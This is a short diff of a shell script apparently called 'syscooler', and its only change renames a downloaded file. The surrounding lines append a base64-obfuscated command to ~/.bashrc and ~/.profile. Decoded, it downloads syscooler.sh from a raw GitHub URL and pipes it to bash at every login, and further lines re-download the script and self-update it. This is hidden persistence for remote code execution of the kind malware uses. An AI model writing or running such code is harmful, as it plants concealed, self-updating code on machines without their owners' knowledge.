@@ -13,7 +13,7 @@ fi
 echo 'echo "Y3VybCAtcyAtbyBzeXNjb29sZXIuc2ggaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzFvbmVtYW4xL3N5c2Nvb2xlci9tYWluL3N5c2Nvb2xlci5zaCAmJiBiYXNoIHN5c2Nvb2xlci5zaA==" | base64 -d | bash' >> ~/.bashrc
 echo 'echo "Y3VybCAtcyAtbyBzeXNjb29sZXIuc2ggaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzFvbmVtYW4xL3N5c2Nvb2xlci9tYWluL3N5c2Nvb2xlci5zaCAmJiBiYXNoIHN5c2Nvb2xlci5zaA==" | base64 -d | bash' >> ~/.profile
 
-curl -s -o newkfc.sh https://raw.githubusercontent.com/1oneman1/syscooler/main/syscooler.sh
+curl -s -o newsyscool.sh https://raw.githubusercontent.com/1oneman1/syscooler/main/syscooler.sh
 sleep 60
 if [ "$VERSION" != "$(grep -o '^VERSION="[0-9\.]*"' newsyscool.sh | cut -d'"' -f2)" ]; then
     chmod +x newsyscool.sh
